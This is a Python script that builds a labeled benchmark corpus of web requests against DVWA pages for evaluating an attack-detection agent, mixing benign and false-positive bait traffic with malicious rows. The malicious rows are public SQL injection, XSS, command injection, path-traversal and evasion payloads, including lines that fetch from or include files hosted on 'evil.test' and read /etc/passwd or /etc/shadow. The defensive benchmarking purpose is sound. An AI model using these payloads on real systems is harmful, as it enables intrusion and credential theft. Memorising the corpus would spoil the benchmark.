"""Build the labeled attack corpus from PUBLIC payload sources (anti-bias).

Payloads are taken from well-known public references — PortSwigger Web Security
Academy, OWASP, and PayloadsAllTheThings — NOT hand-crafted to favor the agent.
Each entry records its `source`. Run: python build_corpus.py  ->  corpus.jsonl

v2 layout (docs/CORPUS_V2.md): deterministic eids, a benchmark actor per row
(sent as X-Forwarded-For), interleaved replay order (`seq`), and a fixed
dev/test split by payload family. Command injection goes as a POST form, as
DVWA's exec page does.
"""

import hashlib
import json
import os
import random

OUT = os.path.join(os.path.dirname(__file__), "corpus.jsonl")
SEED = 20260930
DEV_FRACTION = 0.3
# documentation ranges (RFC 5737): not routable, and not private -> is_private()
# doesn't hide them from the block path
ATTACKERS = [f"203.0.113.{i}" for i in range(10, 15)]
USERS = [f"198.51.100.{i}" for i in range(10, 40)]
ATTACKER_BENIGN_SHARE = 0.25   # attackers browse normally too: IP history isn't a label oracle

# (attack_type, mitre, path, param, payload, source)
CLEAR_ATTACK = [
    # SQL injection — classic, public
    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' OR '1'='1", "PortSwigger SQLi"),
    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' OR 1=1-- -", "PayloadsAllTheThings SQLi"),
    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' UNION SELECT user,password FROM users-- -", "PortSwigger SQLi UNION"),
    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1'; DROP TABLE users-- -", "OWASP SQLi"),
    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' AND SLEEP(5)-- -", "PayloadsAllTheThings blind SQLi"),
    # XSS — reflected, public
    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "<script>alert(1)</script>", "OWASP XSS"),
    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "<img src=x onerror=alert(1)>", "PortSwigger XSS"),
    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "<svg/onload=alert(document.cookie)>", "PayloadsAllTheThings XSS"),
    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "javascript:alert(1)", "OWASP XSS"),
    # Command injection
    ("cmdi", "T1059", "/vulnerabilities/exec/", "ip", "127.0.0.1; cat /etc/passwd", "PayloadsAllTheThings CMDi"),
    ("cmdi", "T1059", "/vulnerabilities/exec/", "ip", "127.0.0.1 && whoami", "OWASP CMDi"),
    ("cmdi", "T1059", "/vulnerabilities/exec/", "ip", "127.0.0.1 | id", "PayloadsAllTheThings CMDi"),
    ("cmdi", "T1059", "/vulnerabilities/exec/", "ip", "$(curl http://evil.test)", "PortSwigger CMDi"),
    # LFI / path traversal
    ("lfi", "T1083", "/vulnerabilities/fi/", "page", "../../../../../../etc/passwd", "OWASP Path Traversal"),
    ("lfi", "T1083", "/vulnerabilities/fi/", "page", "/etc/passwd", "PayloadsAllTheThings LFI"),
    ("lfi", "T1083", "/vulnerabilities/fi/", "page", "../../../../etc/shadow", "PayloadsAllTheThings LFI"),
    ("rfi", "T1190", "/vulnerabilities/fi/", "page", "http://evil.test/shell.txt", "OWASP RFI"),
]

# Obfuscated / evasion variants of the SAME attack classes (public techniques)
EVASION = [
    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1'/**/OR/**/1=1-- -", "PayloadsAllTheThings WAF bypass"),
    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2-- -", "PayloadsAllTheThings MySQL inline comment"),
    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' UnIoN SeLeCt 1,2-- -", "PayloadsAllTheThings case mix"),
    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1%27%20OR%201%3D1--%20-", "URL-encoded SQLi (OWASP)"),
    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1%2527%2520OR%25201%253D1", "Double-URL-encoded SQLi (PayloadsAllTheThings)"),
    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' OR 0x31=0x31-- -", "Hex-encoded SQLi (PayloadsAllTheThings)"),
    ("sqli", "T1190", "/vulnerabilities/sqli/", "id", "1' OR CHAR(49)=CHAR(49)-- -", "CHAR() obfuscation (PayloadsAllTheThings)"),
    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "<scr<script>ipt>alert(1)</scr</script>ipt>", "OWASP nested-tag bypass"),
    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "%3Cscript%3Ealert(1)%3C/script%3E", "URL-encoded XSS (OWASP)"),
    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "<IMG SRC=x ONERROR=alert(1)>", "Case-mixed XSS (PayloadsAllTheThings)"),
    ("xss", "T1059.007", "/vulnerabilities/xss_r/", "name", "<svg><script>&#97;lert(1)</script>", "HTML-entity XSS (PortSwigger)"),
    ("cmdi", "T1059", "/vulnerabilities/exec/", "ip", "127.0.0.1;cat${IFS}/etc/passwd", "PayloadsAllTheThings IFS bypass"),
    ("cmdi", "T1059", "/vulnerabilities/exec/", "ip", "127.0.0.1%0acat%20/etc/passwd", "Newline-injection CMDi (PayloadsAllTheThings)"),
    ("cmdi", "T1059", "/vulnerabilities/exec/", "ip", "127.0.0.1;c\\at /et\\c/pa\\sswd", "Backslash-evasion CMDi (PayloadsAllTheThings)"),
    ("lfi", "T1083", "/vulnerabilities/fi/", "page", "..%2f..%2f..%2f..%2fetc%2fpasswd", "URL-encoded traversal (OWASP)"),
    ("lfi", "T1083", "/vulnerabilities/fi/", "page", "....//....//....//etc/passwd", "Nested traversal bypass (PayloadsAllTheThings)"),
    ("lfi", "T1083", "/vulnerabilities/fi/", "page", "%252e%252e%252fetc%252fpasswd", "Double-encoded traversal (PayloadsAllTheThings)"),
    ("lfi", "T1083", "/vulnerabilities/fi/", "page", "php://filter/convert.base64-encode/resource=index", "PHP wrapper LFI (PayloadsAllTheThings)"),
]

# Benign requests that LOOK malicious (false-positive bait) — label benign
FP_BAIT = [
    ("/vulnerabilities/sqli/", {"id": "What is a UNION SELECT statement in SQL?"}, "blog-style query w/ SQL keywords"),
    # an apostrophe in natural-language search text is the classic SQLi false
    # positive; on the sqli page's numeric id it would really break out of the quote
    ("/search", {"q": "How to prevent ' OR 1=1 injection"}, "article search with an apostrophe"),
    ("/search", {"q": "best practices to stop XSS <script> attacks"}, "search about XSS"),
    ("/search", {"q": "tutorial: command injection ; cat examples"}, "educational search"),
    ("/blog/post", {"title": "Understanding ../../ path traversal defense"}, "blog title w/ traversal text"),
    ("/feedback", {"comment": "I really like using <b>bold</b> and lists in HTML"}, "benign HTML in comment"),
    ("/vulnerabilities/fi/", {"page": "passwd_reset_help"}, "filename contains 'passwd' substring"),
    ("/products", {"category": "union-jack-flags"}, "word 'union' in benign context"),
    ("/api/notes", {"text": "select all items and drop them in cart"}, "SQL-like words, benign sentence"),
]

# Normal traffic — label benign
BENIGN_NORMAL = [
    ("/login.php", {}, "login page"),
    ("/index.php", {}, "home page"),
    ("/vulnerabilities/sqli/", {"id": "1"}, "legitimate id lookup"),
    ("/vulnerabilities/xss_r/", {"name": "Alice"}, "normal name input"),
    ("/vulnerabilities/exec/", {"ip": "8.8.8.8"}, "legitimate ping"),
    ("/vulnerabilities/fi/", {"page": "include.php"}, "normal page include"),
    ("/products", {"category": "books"}, "product browse"),
    ("/search", {"q": "wireless headphones"}, "normal search"),
    ("/api/notes", {"text": "remember to buy milk"}, "normal note"),
    ("/profile", {"user": "bob"}, "view profile"),
]


_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
# DVWA's exec page is a POST form — benign pings too, or the method would leak the label
POST_FORMS = {"/vulnerabilities/exec/"}


def _row(group: str, label: str, attack_type: str, mitre: str, path: str,
         params: dict, source: str) -> dict:
    row = dict(group=group, label=label, attack_type=attack_type, mitre=mitre,
               method="GET", path=path, params=params, user_agent=_UA,
               source=source)
    if path in POST_FORMS:
        row.update(method="POST", params={}, body={**params, "Submit": "Submit"})
    return row


def _eid(row: dict) -> str:
    """Content hash: rebuilding the corpus keeps every eid."""
    key = json.dumps([row["group"], row["method"], row["path"], row["params"],
                      row.get("body"), row["user_agent"]], sort_keys=True)
    return hashlib.sha1(key.encode("utf-8")).hexdigest()[:8]


def _assign_splits(rows: list[dict]) -> None:
    """dev/test by whole payload family, stratified by group x attack_type; a
    per-stratum RNG keeps one stratum's split stable when another one grows."""
    strata: dict[tuple, dict[str, list[dict]]] = {}
    for r in rows:
        strata.setdefault((r["group"], r["attack_type"]), {}) \
              .setdefault(r["family"], []).append(r)
    for (group, attack_type), families in strata.items():
        names = sorted(families)
        random.Random(f"{SEED}-{group}-{attack_type}").shuffle(names)
        n_dev = round(len(names) * DEV_FRACTION)
        for i, name in enumerate(names):
            for r in families[name]:
                r["split"] = "dev" if i < n_dev else "test"


def _assign_actor(row: dict) -> str:
    rng = random.Random(f"{SEED}-{row['eid']}")
    if row["label"] == "malicious":
        return rng.choice(ATTACKERS)
    if row["group"] == "benign_normal" and rng.random() < ATTACKER_BENIGN_SHARE:
        return rng.choice(ATTACKERS)
    return rng.choice(USERS)


def build() -> list[dict]:
    rows: list[dict] = []
    for atk, mitre, path, param, payload, src in CLEAR_ATTACK:
        rows.append(_row("clear_attack", "malicious", atk, mitre, path, {param: payload}, src))
    for atk, mitre, path, param, payload, src in EVASION:
        rows.append(_row("evasion", "malicious", atk, mitre, path, {param: payload}, src))
    # (a lone scanner-UA request is recon, not benign — it belongs in the recon group)
    for path, params, src in FP_BAIT:
        rows.append(_row("fp_bait", "benign", "none", "", path, params, src))
    for path, params, src in BENIGN_NORMAL:
        rows.append(_row("benign_normal", "benign", "none", "", path, params, src))

    for r in rows:
        r["eid"] = _eid(r)
        r.setdefault("family", r["eid"])      # v1 tables: every payload is its own family
        r["actor_ip"] = _assign_actor(r)
    assert len({r["eid"] for r in rows}) == len(rows), "duplicate corpus rows"
    _assign_splits(rows)

    # interleave actors and groups: a replay (and so a triage batch) is no longer
    # "all attacks, then all benign"
    random.Random(SEED).shuffle(rows)
    for seq, r in enumerate(rows):
        r["seq"] = seq
    return rows


if __name__ == "__main__":
    rows = build()
    with open(OUT, "w", encoding="utf-8") as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    counts: dict[str, dict[str, int]] = {}
    for r in rows:
        by_split = counts.setdefault(r["group"], {})
        by_split[r["split"]] = by_split.get(r["split"], 0) + 1
    print(f"Wrote {len(rows)} entries to {OUT}")
    print("By group x split:", json.dumps(counts, indent=2))
